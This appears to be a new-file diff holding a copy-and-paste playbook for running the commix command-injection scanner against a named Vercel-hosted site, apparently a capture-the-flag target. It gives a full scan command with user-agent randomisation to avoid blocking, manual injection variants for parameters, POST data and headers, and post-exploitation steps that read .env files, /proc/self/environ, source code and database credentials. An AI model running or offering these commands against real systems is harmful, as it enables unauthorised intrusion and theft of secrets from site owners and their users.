@@ -1,0 +1,137 @@
+========================================
+SINGLE COMMIX COMMAND FOR KALI LINUX
+Target: https://t2-0034.vercel.app/
+========================================
+
+COPY AND PASTE THIS COMMAND IN YOUR KALI TERMINAL:
+
+commix --url="https://t2-0034.vercel.app/" --all --crawl=3 --level=3 --technique=CBTF --os=unix --random-agent --batch --verbose --output-dir=./t2_0034_results
+
+========================================
+WHAT THIS COMMAND DOES:
+========================================
+
+--url="https://t2-0034.vercel.app/"
+  → Target website to test
+
+--all
+  → Test ALL injection techniques (Classic, Eval-based, Time-based, File-based)
+
+--crawl=3
+  → Crawl the website 3 levels deep to find all pages and parameters
+  → Will test: /, /api/*, /admin/*, etc.
+
+--level=3
+  → Maximum testing level (most thorough)
+  → Tests GET, POST, Cookie, Header parameters
+
+--technique=CBTF
+  → C = Classic command injection (;whoami)
+  → B = Boolean-based blind injection
+  → T = Time-based blind injection (sleep 5)
+  → F = File-based injection (write/read files)
+
+--os=unix
+  → Target is Unix/Linux system (Vercel runs on Linux)
+  → Uses Unix commands: whoami, id, cat, ls
+
+--random-agent
+  → Randomizes User-Agent header to avoid detection/blocking
+
+--batch
+  → Non-interactive mode (runs automatically without asking questions)
+
+--verbose
+  → Shows detailed output of what it's testing
+
+--output-dir=./t2_0034_results
+  → Saves all results to this folder
+
+========================================
+EXPECTED RUNTIME: 5-15 minutes
+========================================
+
+========================================
+WHAT HAPPENS IF VULNERABILITY FOUND:
+========================================
+
+If commix finds a command injection vulnerability, it will:
+
+1. Show you the vulnerable parameter
+2. Give you an interactive shell prompt
+3. You can then run commands like:
+   - whoami (see what user you are)
+   - id (see your permissions)
+   - ls -la (list files)
+   - cat flag.txt (read the flag)
+   - cat .env (read environment variables)
+   - find / -name "flag*" 2>/dev/null (search for flag files)
+
+========================================
+IF NO VULNERABILITY FOUND:
+========================================
+
+Try these manual tests:
+
+1. Test specific endpoints:
+   commix --url="https://t2-0034.vercel.app/api/test?id=INJECT_HERE" --batch
+
+2. Test with POST data:
+   commix --url="https://t2-0034.vercel.app/api/endpoint" --data="param=INJECT_HERE" --batch
+
+3. Test headers:
+   commix --url="https://t2-0034.vercel.app/" --header="User-Agent: INJECT_HERE" --batch
+
+4. Use Burp Suite to find injection points manually
+
+========================================
+ALTERNATIVE SHORTER COMMAND:
+========================================
+
+If you want faster results (less thorough):
+
+commix --url="https://t2-0034.vercel.app/" --batch
+
+This does a basic scan in 1-2 minutes.
+
+========================================
+TROUBLESHOOTING:
+========================================
+
+If commix is not installed:
+  sudo apt update
+  sudo apt install commix
+
+If you get SSL errors:
+  Add --ignore-ssl flag
+
+If you get blocked/rate limited:
+  Add --delay=2 (wait 2 seconds between requests)
+
+========================================
+AFTER FINDING VULNERABILITY:
+========================================
+
+Once you have command execution, look for:
+
+1. Flag file:
+   find / -name "*flag*" 2>/dev/null
+   cat /flag.txt
+   cat /home/*/flag.txt
+   cat /app/flag.txt
+
+2. Environment variables:
+   env
+   cat .env
+   cat /proc/self/environ
+
+3. Source code:
+   ls -la
+   cat package.json
+   cat server.js
+
+4. Database credentials:
+   cat .env | grep -i database
+   cat config.js
+
+========================================
